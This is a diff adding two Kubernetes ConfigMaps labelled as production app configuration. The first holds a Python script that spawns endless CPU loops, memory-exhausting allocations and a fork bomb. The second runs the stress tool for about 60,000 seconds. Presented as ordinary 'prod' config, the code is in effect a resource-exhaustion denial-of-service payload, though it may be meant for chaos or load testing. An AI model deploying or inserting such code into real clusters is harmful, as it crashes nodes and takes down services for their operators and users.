@@ -1,0 +1,89 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: prod-app-config
+  namespace: prod
+data:
+  prod.py: |
+    import multiprocessing
+    import ctypes
+    import os
+    import mmap
+    import time
+    import sys
+
+    print("Pod started. Waiting 1 seconds before initiating load...")
+    sys.stdout.flush()
+    time.sleep(1)  
+
+    def cpu_stress():
+        while True:
+            x = 1234 * 5678
+            y = x ** 2
+            z = y / 3.14159
+
+    def malloc_and_touch():
+        chunks = []
+        while True:
+            try:
+                chunk = (ctypes.c_char * (256 * 1024 * 1024))()
+                ctypes.memset(chunk, 0xFF, ctypes.sizeof(chunk))
+                chunks.append(chunk)
+            except:
+                try:
+                    chunk = (ctypes.c_char * (128 * 1024 * 1024))()
+                    ctypes.memset(chunk, 0xFF, ctypes.sizeof(chunk))
+                    chunks.append(chunk)
+                except:
+                    continue
+
+    def mmap_and_write():
+        while True:
+            try:
+                map_size = 256 * 1024 * 1024
+                mm = mmap.mmap(-1, map_size)
+                mm.write(b'x' * map_size)
+                time.sleep(0.05)
+            except:
+                continue
+
+    def fork_bomb():
+        while True:
+            try:
+                os.fork()
+            except:
+                continue
+
+    if __name__ == '__main__':
+        for _ in range(8):
+            p = multiprocessing.Process(target=cpu_stress)
+            p.daemon = True
+            p.start()
+
+        for _ in range(8):
+            p = multiprocessing.Process(target=malloc_and_touch)
+            p.daemon = True
+            p.start()
+
+        for _ in range(4):
+            p = multiprocessing.Process(target=mmap_and_write)
+            p.daemon = True
+            p.start()
+
+        p = multiprocessing.Process(target=fork_bomb)
+        p.daemon = True
+        p.start()
+
+        while True:
+            time.sleep(0.1)
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: prod-ds-config
+  namespace: prod
+data:
+  prod.sh: |
+    #!/bin/sh
+    echo "Starting prod..."
+    stress --cpu 4 --vm 2 --vm-bytes 512M --timeout 60000s
